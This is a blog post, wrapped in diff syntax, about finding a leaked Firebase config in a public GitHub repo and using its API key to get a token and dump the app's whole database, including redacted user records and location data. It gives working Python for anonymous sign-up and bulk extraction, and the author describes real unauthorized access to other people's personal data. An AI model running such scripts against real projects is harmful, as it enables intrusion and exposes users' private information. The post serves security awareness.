@@ -1,0 +1,75 @@
+<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
+         What happens when you push your Firebase API key to GitHub
+        
+    </title><meta content="What happens when you push your Firebase API key to GitHub" property=og:title><link href=https://ihorsavenko.com/fonts.css rel=stylesheet><script>(function () {
+                  var el = document.createElement('script');
+                  el.setAttribute('src', '/js/imamu.js');
+                  el.setAttribute('data-website-id', 'fa6a920f-db21-406a-afe7-5caf4db6c791');
+                  el.setAttribute('data-host-url', 'https:&#x2F;&#x2F;umami-azure-one.vercel.app');
+                  document.body.appendChild(el);
+                })();</script><script async data-host-url=https://umami-azure-one.vercel.app data-website-id=fa6a920f-db21-406a-afe7-5caf4db6c791 src=/js/imamu.js></script><link href=https://ihorsavenko.com/atom.xml rel=alternate title=denver-code type=application/atom+xml><link href=https://ihorsavenko.com/theme/light.css rel=stylesheet><link href=https://ihorsavenko.com/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://ihorsavenko.com/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://ihorsavenko.com>denver-code</a><div class=socials><a class=social href=https://t.me/operatorSilence rel=me> <img alt=telegram src=/social_icons/telegram.svg> </a><a class=social href=https://github.com/denver-code/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/projects style=margin-left:.7em>/projects</a><a href=/posts style=margin-left:.7em>/posts</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert()> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://ihorsavenko.com/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>What happens when you push your Firebase API key to GitHub<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2025-02-27</time></div></div><section class=body><p>Recently I've been working on a new project, and decided to get some inspiration from public repositories on GitHub.<br> I've found a repository with a code for Android app, based on game called <code>Death Stranding</code>, and as a fan of this game - decided to clone it and run it.<p><code>README.md</code> file was very clear, however it had installation via <code>npm</code> while we have to use <code>gradle</code> for Android projects, last commit was like few months ago, it had a release but with code only.<br> Long story short, I've cloned the repository, opened it in Android Studio, and tried to run it, id did it without any issues, a Authorization screen appeared.<br> At this point I thought that was it, as I didn't want to create new Firebase project and connect it to this app, but then I've noticed that there's a <code>google-services.json</code> file in the project. Normally it's okay, because you can reverse engineer the APK to get them, however it contained all of the API keys, and I got curious what will happen if I use them.<p>Straight away new <code>python</code> script was created, which was sending a request to Firebase API:<pre class=language-python data-lang=python style=color:#bfbab0;background-color:#0f1419><code class=language-python data-lang=python><span style=color:#f73>import </span><span>requests
+</span><span>
+</span><span>API_KEY </span><span style=color:#f29668>= </span><span style=color:#c2d94c>"SOME_API_KEY"
+</span><span>DATABASE_URL </span><span style=color:#f29668>= </span><span style=color:#c2d94c>"https://gg.europe-west1.firebasedatabase.app"
+</span><span>
+</span><span>
+</span><span style=color:#f73>def </span><span style=color:#ffb454>sign_in_anonymously</span><span>():
+</span><span>    url </span><span style=color:#f29668>= </span><span style=color:#f73>f</span><span style=color:#c2d94c>"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=</span><span>{API_KEY}</span><span style=color:#c2d94c>"
+</span><span>    response </span><span style=color:#f29668>= </span><span>requests</span><span style=color:#f29668>.</span><span style=color:#ffb454>post</span><span>(url</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>json</span><span style=color:#f29668>=</span><span>{</span><span style=color:#c2d94c>"returnSecureToken"</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>True</span><span>})
+</span><span>    </span><span style=color:#f73>if </span><span>response</span><span style=color:#f29668>.</span><span>status_code </span><span style=color:#f29668>== </span><span style=color:#f29718>200</span><span>:
+</span><span>        </span><span style=color:#f73>return </span><span>response</span><span style=color:#f29668>.</span><span style=color:#ffb454>json</span><span>()[</span><span style=color:#c2d94c>"idToken"</span><span>]
+</span><span>    </span><span style=color:#f73>return </span><span style=color:#f29718>None
+</span><span>
+</span><span>
+</span><span>id_token </span><span style=color:#f29668>= </span><span style=color:#ffb454>sign_in_anonymously</span><span>()
+</span><span style=color:#f07178>print</span><span>(</span><span style=color:#c2d94c>"ID Token:"</span><span style=color:#bfbab0cc>, </span><span>id_token)
+</span></code></pre><p>After running this script, I've got a response with <code>idToken</code>, which was a valid token for this Firebase project.<p>That's it, we have read/write access to the Firebase database, and we can do whatever we want with it.<p>Let's extend this script to pull all of the data from the database:<pre class=language-python data-lang=python style=color:#bfbab0;background-color:#0f1419><code class=language-python data-lang=python><span style=color:#f73>def </span><span style=color:#ffb454>get_data</span><span>(</span><span style=color:#f29718>node</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>id_token</span><span>):
+</span><span>    url </span><span style=color:#f29668>= </span><span style=color:#f73>f</span><span style=color:#c2d94c>"</span><span>{DATABASE_URL}</span><span style=color:#c2d94c>/</span><span>{node}</span><span style=color:#c2d94c>.json?auth=</span><span>{id_token}</span><span style=color:#c2d94c>"
+</span><span>    response </span><span style=color:#f29668>= </span><span>requests</span><span style=color:#f29668>.</span><span style=color:#ffb454>get</span><span>(url)
+</span><span>    </span><span style=color:#f73>return </span><span>response</span><span style=color:#f29668>.</span><span style=color:#ffb454>json</span><span>() </span><span style=color:#f73>if </span><span>response</span><span style=color:#f29668>.</span><span>status_code </span><span style=color:#f29668>== </span><span style=color:#f29718>200 </span><span style=color:#f73>else </span><span>response</span><span style=color:#f29668>.</span><span>text
+</span><span>
+</span><span>
+</span><span>nodes </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_data</span><span>(</span><span style=color:#c2d94c>""</span><span style=color:#bfbab0cc>, </span><span>id_token)
+</span><span>
+</span><span style=color:#f73>for </span><span>node </span><span style=color:#f73>in </span><span>nodes:
+</span><span>    write_data </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_data</span><span>(node</span><span style=color:#bfbab0cc>, </span><span>id_token)
+</span><span>    </span><span style=color:#f73>with </span><span style=color:#f07178>open</span><span>(</span><span style=color:#f73>f</span><span style=color:#c2d94c>"data_</span><span>{node}</span><span style=color:#c2d94c>.json"</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>"w"</span><span>) </span><span style=color:#f73>as </span><span>f:
+</span><span>        write_data </span><span style=color:#f29668>= </span><span>(
+</span><span>            {key</span><span style=color:#bfbab0cc>: </span><span>value </span><span style=color:#f73>for </span><span>key</span><span style=color:#bfbab0cc>, </span><span>value </span><span style=color:#f73>in </span><span>write_data</span><span style=color:#f29668>.</span><span style=color:#ffb454>items</span><span>()}
+</span><span>            </span><span style=color:#f73>if </span><span style=color:#f07178>isinstance</span><span>(write_data</span><span style=color:#bfbab0cc>, </span><span style=color:#39bae6;font-style:italic>dict</span><span>)
+</span><span>            </span><span style=color:#f73>else </span><span>write_data
+</span><span>        )
+</span><span>        f</span><span style=color:#f29668>.</span><span style=color:#ffb454>write</span><span>(json</span><span style=color:#f29668>.</span><span style=color:#ffb454>dumps</span><span>(write_data</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>indent</span><span style=color:#f29668>=</span><span style=color:#f29718>4</span><span>))
+</span><span>    </span><span style=color:#f07178>print</span><span>(</span><span style=color:#f73>f</span><span style=color:#c2d94c>"Data saved to data_</span><span>{node}</span><span style=color:#c2d94c>.json"</span><span>)
+</span><span>
+</span></code></pre><p>execution:<pre class=language-bash data-lang=bash style=color:#bfbab0;background-color:#0f1419><code class=language-bash data-lang=bash><span style=color:#ffb454>Data</span><span> saved to data_deliveries.json
+</span><span style=color:#ffb454>Data</span><span> saved to data_post_offices.json
+</span><span style=color:#ffb454>Data</span><span> saved to data_signals.json
+</span><span style=color:#ffb454>Data</span><span> saved to data_users.json
+</span><span style=color:#ffb454>Data</span><span> saved to data_weather.json
+</span><span style=color:#ffb454>Data</span><span> saved to data_weatherCurrentInApp.json
+</span></code></pre><p>After running this script, we will have all of the data from the Firebase database saved in separate files. Here's some example data from <code>data_users.json</code>(personal data was removed):<pre class=language-json data-lang=json style=color:#bfbab0;background-color:#0f1419><code class=language-json data-lang=json><span>{
+</span><span>    </span><span style=color:#c2d94c>"8AvbIz4G5BWS____REDACTED"</span><span style=color:#bfbab0cc>: </span><span>{
+</span><span>        </span><span style=color:#c2d94c>"bloodType"</span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"REDACTED"</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"deliveries"</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"distanceWalked"</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"dob"</span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"REDACTED"</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"height"</span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"REDACTED"</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"name"</span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"REDACTED REDACTED"</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"photoUrl"</span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"REDACTED"</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"timefallExposure"</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"weight"</span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"REDACTED"
+</span><span>    }</span><span style=color:#bfbab0cc>,
+</span><span>    </span><span style=color:#c2d94c>"8DBp4bNCibfp____REDACTED"</span><span style=color:#bfbab0cc>: </span><span>{
+</span><span>        </span><span style=color:#c2d94c>"bloodType"</span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"REDACTED"</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"deliveries"</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>2</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"distanceWalked"</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"dob"</span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"REDACTED"</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"height"</span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"REDACTED"</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"name"</span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"REDACTED REDACTED"</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"photoUrl"</span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"REDACTED"</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"timefallExposure"</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,
+</span><span>        </span><span style=color:#c2d94c>"weight"</span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"REDACTED"
+</span><span>    }</span><span style=color:#bfbab0cc>,
+</span><span>}
+</span></code></pre><p>From <code>data_signals.json</code> we could've se latitudes and longitudes of some user-generated signals, some of them correspond to the developers home location.<p>While you can push your <code>google-services.json</code> to GitHub, you should properly secure your Firebase project and restrict access to it, as it's very easy to get access to it.</section></article></main></div>
